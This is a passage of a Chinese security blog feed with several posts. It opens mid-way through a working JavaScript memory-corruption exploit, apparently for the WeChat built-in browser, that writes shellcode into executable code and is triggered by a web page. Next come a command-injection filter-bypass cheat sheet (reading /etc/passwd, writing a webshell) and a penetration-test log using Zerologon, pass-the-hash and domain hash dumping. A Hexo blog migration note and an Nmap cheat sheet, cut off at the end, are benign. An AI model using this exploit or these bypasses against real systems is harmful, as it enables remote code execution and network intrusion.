class="string"></span></span><br><span class="line"><span class="string">        class DerivedN extends derived_n(i-1) &#123;</span></span><br><span class="line"><span class="string">            constructor() &#123;</span></span><br><span class="line"><span class="string">                super();</span></span><br><span class="line"><span class="string">                return;</span></span><br><span class="line"><span class="string">                <span class="subst">$&#123;<span class="string">&quot;this.a=0;&quot;</span>.repeat(tDerivedNCount)&#125;</span></span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return DerivedN;</span></span><br><span class="line"><span class="string">    &#125;)`</span>);</span><br><span class="line"></span><br><span class="line">    gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> (derived_n(tDerivedNDepth))();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.buffer_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="built_in">this</span>.buffer);</span><br><span class="line">    <span class="built_in">this</span>.leakPtr = <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.page_buffer.slot = obj;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.buffer_view.getUint32(kSlotOffset, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.setPtr = <span class="function"><span class="keyword">function</span> (<span class="params">addr</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.buffer_view.setUint32(kBackingStoreOffset, addr, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.read32 = <span class="function"><span class="keyword">function</span> (<span class="params">addr</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.setPtr(addr);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.page_view.getUint32(<span class="number">0</span>, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.write32 = <span class="function"><span class="keyword">function</span> (<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.setPtr(addr);</span><br><span class="line">        <span class="built_in">this</span>.page_view.setUint32(<span class="number">0</span>, value, <span class="literal">true</span>, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.write8 = <span class="function"><span class="keyword">function</span> (<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.setPtr(addr);</span><br><span class="line">        <span class="built_in">this</span>.page_view.setUint8(<span class="number">0</span>, value, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.setBytes = <span class="function"><span class="keyword">function</span> (<span class="params">addr, content</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; content.length; i++) &#123;</span><br><span class="line">            <span class="built_in">this</span>.write8(addr + i, content[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> oob = oobAccess();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> func_ptr = oob.leakPtr(target_function);</span><br><span class="line">    print(<span class="string">&#x27;[*] target_function at 0x&#x27;</span> + func_ptr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> kCodeInsOffset = <span class="number">0x1b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> code_addr = oob.read32(func_ptr + kCodeInsOffset);</span><br><span class="line">    print(<span class="string">&#x27;[*] code_addr at 0x&#x27;</span> + code_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">    oob.setBytes(code_addr, shellcode);</span><br><span class="line"></span><br><span class="line">    target_function(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    print(<span class="string">&quot;start running&quot;</span>);</span><br><span class="line">    trigger();</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    print(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再把这个js脚本加载到html页面里，微信内置浏览器访问页面即可触发</p><p><img src="../../../../img/21-4-18/2.png" alt="Assassins小白"></p><p><img src="../../../../img/21-4-18/1.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 微信0day </tag>
            
            <tag> Chrome RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行bypass总结</title>
      <link href="2021/04/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cbypass%E6%80%BB%E7%BB%93/"/>
      <url>2021/04/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cbypass%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>少年需有凌云志，不负黄河万古流</p><hr><span id="more"></span><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="替换空格"><a href="#替换空格" class="headerlink" title="替换空格"></a>替换空格</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag.txt</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/1.png" alt="Assassins小白"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$9flag.txt</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/2.png" alt="Assassins小白"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;flag.txt</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/3.png" alt="Assassins小白"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/4.png" alt="Assassins小白"></p><h3 id="利用变量绕过"><a href="#利用变量绕过" class="headerlink" title="利用变量绕过"></a>利用变量绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;c;b&#x3D;at;$a$b flag.txt</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/5.png" alt="Assassins小白"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;w;b&#x3D;h;c&#x3D;o;d&#x3D;a;e&#x3D;m;f&#x3D;i;$a$b$c$d$e$f</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/6.png" alt="Assassins小白"></p><h3 id="利用base编码绕过"><a href="#利用base编码绕过" class="headerlink" title="利用base编码绕过"></a>利用base编码绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;echo &#39;Y2F0Cg&#x3D;&#x3D;&#39; | base64 -d&#96; flag.txt</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/7.png" alt="Assassins小白"></p><h3 id="连接符截断绕过"><a href="#连接符截断绕过" class="headerlink" title="连接符截断绕过"></a>连接符截断绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#39;a&#39;t flag.txt</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/8.png" alt="Assassins小白"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at flag.txt</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/9.png" alt="Assassins小白"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca$@t flag.txt</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/10.png" alt="Assassins小白"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wh$1oami</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/29.png" alt="Assassins小白"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoa$*mi</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/30.png" alt="Assassins小白"></p><h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p>在Linux里?可以代替一个任意字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;???&#x2F;[l-n]s&#x2F;&#x2F;可以代替ls</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/11.png" alt="Assassins小白"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;???&#x2F;c?t flag.txt&#x2F;&#x2F;可代替cat flag.txt</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/12.png" alt="Assassins小白"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;???&#x2F;c?t &#x2F;???&#x2F;p?????&#x2F;&#x2F;可代替cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/13.png" alt="Assassins小白"></p><p>星号 <code>*</code> 在linux中用来代表一个或多个任何字符，包括空字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*&#x2F;bin&#x2F;wh*i</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/31.png" alt="Assassins小白"></p><p><code>?</code> 和 <code>*</code> 组合使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;???&#x2F;c?t &#x2F;e??&#x2F;p*d</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/32.png" alt="Assassins小白"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">w&#96;\saldkj2190&#96;ho&#96;\12wsa2&#96;am&#96;\foj11&#96;i</span><br><span class="line">wh$(70shuai)oa$(fengfeng)mi</span><br></pre></td></tr></table></figure><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="符号与命令的绕过"><a href="#符号与命令的绕过" class="headerlink" title="符号与命令的绕过"></a>符号与命令的绕过</h3><p>在看一个例子开始之前，首先了解一点， <code>&quot;</code> <code>^</code> 和成对的圆括号 <code>()</code> 符号并不会影响命令的执行。在windows环境下，命令可以不区分大小写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((((Wh^o^am&quot;&quot;i))))</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/14.png" alt="Assassins小白"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w&quot;h&quot;o&quot;a&quot;m&quot;i</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/15.png" alt="Assassins小白"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wh&quot;&quot;o^a^mi&quot;</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/16.png" alt="Assassins小白"></p><p>可以加无数个 <code>”</code> 但不能同时连续加2个 <code>^</code> 符号，因为 <code>^</code> 号是cmd中的转义符，跟在他后面的符号会被转义</p><h3 id="set命令和windows变量的绕过"><a href="#set命令和windows变量的绕过" class="headerlink" title="set命令和windows变量的绕过"></a>set命令和windows变量的绕过</h3><p>set命令可以用来设置一个变量</p><p>变量使用%%包裹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set xb&#x3D;1111</span><br><span class="line">echo %xb%</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/17.png" alt="Assassins小白"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set a&#x3D;whoami</span><br><span class="line">%a%</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/18.png" alt="Assassins小白"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set a&#x3D;wh&quot;&quot;o</span><br><span class="line">set b&#x3D;a^mi&quot;</span><br><span class="line">%a%%b%</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/19.png" alt="Assassins小白"></p><h3 id="切割字符串绕过"><a href="#切割字符串绕过" class="headerlink" title="切割字符串绕过"></a>切割字符串绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%a:~0%&#x2F;&#x2F;取出变量a中的所有字符</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/20.png" alt="Assassins小白"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%a:~0,6%&#x2F;&#x2F;取出a的值，从第0个位置开始，取6个值</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/21.png" alt="Assassins小白"></p><p>电脑上的环境变量还是挺多的，那我几乎可以用这种方式执行任何命令，因为这些变量的值，几乎都有26个字母在了<br>从简单的开始，如果命令执行不允许空格，被过滤，那么可以用如下方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net%CommonProgramFiles:~10,1%user</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/22.png" alt="Assassins小白"></p><p>还可以配合其他符号一起使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n^et%CommonProgramFiles:~10,1%us^er</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/23.png" alt="Assassins小白"></p><p>我们可以通过这种方式给网站写个webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set mm&#x3D;a lvehpp?G</span><br><span class="line">echo %mm:~4,1%%mm:~3,1%%mm:~0,1%%mm:~2,1%</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/24.png" alt="Assassins小白"></p><h3 id="逻辑运算符绕过"><a href="#逻辑运算符绕过" class="headerlink" title="逻辑运算符绕过"></a>逻辑运算符绕过</h3><p>使用 <code>|</code> 符号分隔两条命令，只会执行后面那条命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping baidu.com -n 1 | w&quot;&quot;h^o^a^m^i</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/25.png" alt="Assassins小白"></p><p>在 <code>||</code> 符号的情况下，只有前面的命令失败，才会执行后面的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping a || whoami</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/26.png" alt="Assassins小白"></p><p><code>&amp;</code> 符号，不管前面的命令是成功还是失败，都会执行后面的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1 -n 1 &amp; whoami</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/27.png" alt="Assassins小白"></p><p>而 <code>&amp;&amp;</code> 符号就必须两条命令都为真才可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping baidu.com -n 1 &amp;&amp; whoami</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-4-12/28.png" alt="Assassins小白"></p><p><a href="https://mp.weixin.qq.com/s/FqIbIZmSGp9CcX6buIOGSA">https://mp.weixin.qq.com/s/FqIbIZmSGp9CcX6buIOGSA</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bypass </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次朴实无华的渗透测试</title>
      <link href="2021/03/21/%C2%96%E4%B8%80%E6%AC%A1%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>2021/03/21/%C2%96%E4%B8%80%E6%AC%A1%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>远赴人间惊鸿宴，一睹人间盛世颜</p><hr><span id="more"></span><p>敏感目标，重码<br>后续出的文章，排版有点乱</p><p>目标：<a href="https://x.x.xxx.206/owa/">https://x.x.xxx.206/owa/</a><br>扫描C段发现 该站点有上传<br>直接上传获取一个shell</p><p><img src="../../../../img/21-3-21_2/1.png" alt="Assassins小白"></p><p>systeminfo</p><p><img src="../../../../img/21-3-21_2/2.png" alt="Assassins小白"></p><p>执行命令上线CS<br>域命令不能使用</p><p><img src="../../../../img/21-3-21_2/3.png" alt="Assassins小白"></p><p>收集数据库配置信息，试了几个能连接上</p><p><img src="../../../../img/21-3-21_2/4.png" alt="Assassins小白"></p><p>导出浏览器密码</p><p><img src="../../../../img/21-3-21_2/5.png" alt="Assassins小白"></p><p>打socks隧道</p><p><img src="../../../../img/21-3-21_2/6.png" alt="Assassins小白"></p><p>扫smb</p><p><img src="../../../../img/21-3-21_2/7.png" alt="Assassins小白"></p><p>192.168.2.5 为域控 机器名为xxxxxA01<br>192.168.2.4 为邮服内网IP<br>机器多为win12以上 win10,尝试批量哈希传递并没有上线的<br>直接使用CVE-2020-1472</p><p><img src="../../../../img/21-3-21_2/8.png" alt="Assassins小白"></p><p>pth</p><p><img src="../../../../img/21-3-21_2/9.png" alt="Assassins小白"></p><p>导出所有用户hash</p><p><img src="../../../../img/21-3-21_2/10.png" alt="Assassins小白"></p><p>补个域控密码还原</p><p><img src="../../../../img/21-3-21_2/11.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github博客迁移</title>
      <link href="2021/03/21/Github%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/"/>
      <url>2021/03/21/Github%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<p>最近刚装完系统，重装之前把博客的源文件拷贝了一份放到移动硬盘里，现在需要把博客恢复，特此记录</p><hr><span id="more"></span><p>先装两个软件</p><p>Node.js：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a></p><p>Git：<a href="https://git-scm.com/download/">https://git-scm.com/download/</a></p><p>因为博客使用的hexo模板，所以还需要安装hexo，命令：<code>npm install -g hexo-cli</code></p><p>装完之后使用 <code>hexo -v</code> 查看有没有成功安装</p><p><img src="../../../../img/21-3-21/1.png" alt="Assassins小白"></p><p>随后新建一个文件夹，当作博客目录，然后cd进去，执行命令初始化 <code>hexo init</code></p><p>初始化完成后会生成一些默认文件，我们把之前旧的文件全部粘贴过来覆盖掉</p><p>这个时候，这个本地环境的文件已经是要发布的文件了</p><p><img src="../../../../img/21-3-21/2.png" alt="Assassins小白"></p><p>使用 <code>hexo server</code> 命令将博客发布在本地的4000端口，即可看到自己发布的文章以及之前博客的界面</p><p>(默认初始化后会生成一个新的hello-world.md文件)</p><p><img src="../../../../img/21-3-21/3.png" alt="Assassins小白"></p><p>现在只差将博客托管到Github上了</p><p>本地设置GIT邮箱、用户名和密码</p><p><code>git config –-global user.email &quot;你的GitHub邮箱&quot;</code></p><p><code>git config –-global user.name &quot;你的GitHub用户名&quot;</code></p><p>本地创建SSH Key</p><p><code>ssh-keygen -t rsa -C &quot;邮箱地址&quot;</code></p><p>上面命令尽量手敲，复制粘贴可能会报错 <code>fatal: not in a git directory</code></p><p>下面的不需要输入，可直接按回车跳过，默认就行</p><p><img src="../../../../img/21-3-21/4.png" alt="Assassins小白"></p><p>这时候就生成公钥私钥了</p><p><img src="../../../../img/21-3-21/5.png" alt="Assassins小白"></p><p>然后把我们电脑上的公钥（id_rsa.pub）拷贝到GitHub的 <code>settings -&gt; SSH and GPG keys -&gt; SSH Keys -&gt; New SSH Key</code></p><p>Title随便写，Key把id_rsa.pub的内容全部复制过去</p><p><img src="../../../../img/21-3-21/6.png" alt="Assassins小白"></p><p>验证下SSH是否设置成功</p><p><code>ssh -T git@github.com</code></p><p>第一次提示不能连接，直接输入yes即可</p><p><img src="../../../../img/21-3-21/7.png" alt="Assassins小白"></p><p><code>hexo g -d </code>部署报错 </p><p><img src="../../../../img/21-3-21/8.png" alt="Assassins小白"></p><p>尝试下载低版本node：<a href="https://nodejs.org/download/release/v12.14.0/">https://nodejs.org/download/release/v12.14.0/</a></p><p><img src="../../../../img/21-3-21/9.png" alt="Assassins小白"></p><p>成功</p>]]></content>
      
      
      
        <tags>
            
            <tag> Github博客 </tag>
            
            <tag> 迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap备忘录</title>
      <link href="2020/08/31/Nmap%E5%A4%87%E5%BF%98%E5%BD%95/"/>
      <url>2020/08/31/Nmap%E5%A4%87%E5%BF%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>如果快乐太难，那祝你百事可乐</p><hr><span id="more"></span><center><h1>Nmap备忘录</h1></center><h3 id="目标规格"><a href="#目标规格" class="headerlink" title="目标规格"></a>目标规格</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1扫描一个IP</span><br><span class="line">nmap 192.168.1.1 192.168.2.1扫描IP段</span><br><span class="line">nmap 192.168.1.1-254扫描一个范围</span><br><span class="line">nmap nmap.org扫描一个域名</span><br><span class="line">nmap 192.168.1.0/24使用CIDR表示法扫描</span><br><span class="line">-iLnmap -iL target.txt扫描文件中的目标</span><br><span class="line">-iRnmap -iR 100扫描100个随机主机</span><br><span class="line">--excludenmap --exclude 192.168.1.1排除列出的主机</span><br></pre></td></tr></table></figure><hr><h3 id="扫描手法"><a href="#扫描手法" class="headerlink" title="扫描手法"></a>扫描手法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-sSnmap 192.168.1.1 -sSTCP SYN端口扫描(有root权限默认)</span><br><span class="line">-sTnmap 192.168.1.1 -sTTCP连接端口扫描(没有root权限默认)</span><br><span class="line">-sUnmap 192.168.1.1 -sUUDP端口扫描</span><br><span class="line">-sAnmap 192.168.1.1 -sATCP ACK端口扫描</span><br><span class="line">-sWnmap 192.168.1.1 -sW滑动窗口扫描</span><br><span class="line">-sMnmap 192.168.1.1 -sMTCP Maimon扫描</span><br></pre></td></tr></table></figure><hr><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-sLnmap 192.168.1.1-3 -sL不扫描,仅列出目标</span><br><span class="line">-snnmap 192.168.1.1/24 -sn禁用端口扫描</span><br><span class="line">-Pnnmap 192.168.1.1-5 -Pn跳过主机发现,直接扫描端口</span><br><span class="line">-PSnmap 192.168.1.1-5 -PS22-25,80端口X上的TCP SYN发现,默认80</span><br><span class="line">-PAnmap 192.168.1.1-5 -PA22-25,80端口X上的TCP ACK发现,默认80</span><br><span class="line">-PUnmap 192.168.1.1-5 -PU53端口X上的UDP发现,默认40125</span><br><span class="line">-PRnmap 192.168.1.1/24 -PR本地网络上的ARP发现</span><br><span class="line">-nnmap 192.168.1.1 -n不做DNS解析</span><br></pre></td></tr></table></figure><hr><h3 id="端口规格"><a href="#端口规格" class="headerlink" title="端口规格"></a>端口规格</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-p nmap 192.168.1.1 -p 21   扫描特定端口</span><br><span class="line">-p nmap 192.168.1.1 -p 21-100   扫描端口范围</span><br><span class="line">-p nmap 192.168.1.1 -p U:53,T:21-25,80   扫描多个TCP和UDP端口</span><br><span class="line">-p- nmap 192.168.1.1 -p-   扫描所有端口</span><br><span class="line">-p nmap 192.168.1.1 -p http,https   基于服务名称的端口扫描</span><br><span class="line">-F nmap 192.168.1.1 -F   快速扫描(100个端口)</span><br><span class="line">--top-ports  nmap 192.168.1.1 --top-ports 2000    扫描前2000个端口</span><br><span class="line">-p-65535     nmap 192.168.1.1 -p-65535   从端口1开始扫描</span><br></pre></td></tr></table></figure><hr><h3 id="时间和性能"><a href="#时间和性能" class="headerlink" title="时间和性能"></a>时间和性能</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-T0 nmap 192.168.1.1 -T0 妄想症,非常非常慢，用于IDS逃逸</span><br><span class="line">-T1 nmap 192.168.1.1 -T1猥琐的,相当慢，用于IDS逃逸</span><br><span class="line">-T2 nmap 192.168.1.1 -T2礼貌的,降低速度以消耗更小的带宽，比默认慢十倍</span><br><span class="line">-T3 nmap 192.168.1.1 -T3正常的,默认，根据目标的反应自动调整时间模式</span><br><span class="line">-T4 nmap 192.168.1.1 -T4野蛮的,在一个很好的网络环境，请求可能会淹没目标</span><br><span class="line">-T5 nmap 192.168.1.1 -T5疯狂的,很可能会淹没目标端口或是漏掉一些开放端口</span><br></pre></td></tr></table></figure><hr><h3 id="NSE脚本"><a href="#NSE脚本" class="headerlink" title="NSE脚本"></a>NSE脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1 -sC 使用默认的NSE脚本进行扫描</span><br><span class="line">nmap 192.168.1.1 --script=banner使用单个脚本扫描,banner示例</span><br><span class="line">nmap 192.168.1.1 --script=http,banner  使用两个脚本扫描,示例http,banner</span><br><span class="line">nmap 192.168.1.1 --script=http*使用通配符扫描,http示例</span><br><span class="line">nmap 192.168.1.1 --script &quot;not intrusive&quot;扫描默认值,删除侵入性脚本</span><br><span class="line">nmap 192.168.1.1 --script=smb-vuln*扫描所有smb漏洞</span><br><span class="line">nmap 192.168.1.1 --script=vuln扫描常见漏洞</span><br></pre></td></tr></table></figure><hr><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1 -v  增加详细程度,-vv效果更好</span><br><span class="line">nmap 192.168.1.1 -oN test.txt 标准输出写入到指定文件中</span><br><span class="line">nmap 192.168.1.1 -oX test.xml 将输入写成xml的形式</span><br><span class="line">nmap 192.168.1.1 -oG grep.txt 将输出写成特殊格式</span><br><span class="line">nmap 192.168.1.1 -oA results 将输出所有格式,有三种 .xml/.gnmap/.nmap</span><br><span class="line">nmap 192.168.1.1 --open  仅显示开放的端口</span><br><span class="line">nmap 192.168.1.1 -T4 --packet-trace  显示所有发送和接收的数据包</span><br><span class="line">nmap --resume test.txt 恢复扫描，配合-oG等命令使用</span><br></pre></td></tr></table></figure><hr><h3 id="服务和版本检测"><a href="#服务和版本检测" class="headerlink" title="服务和版本检测"></a>服务和版本检测</h3><ul><li><p><code>nmap 192.168.1.1 -sV</code></p><pre><code>* 尝试确定端口上运行的服务的版本</code></pre></li><li><p><code>nmap 192.168.1.1 -sV --version-intensity 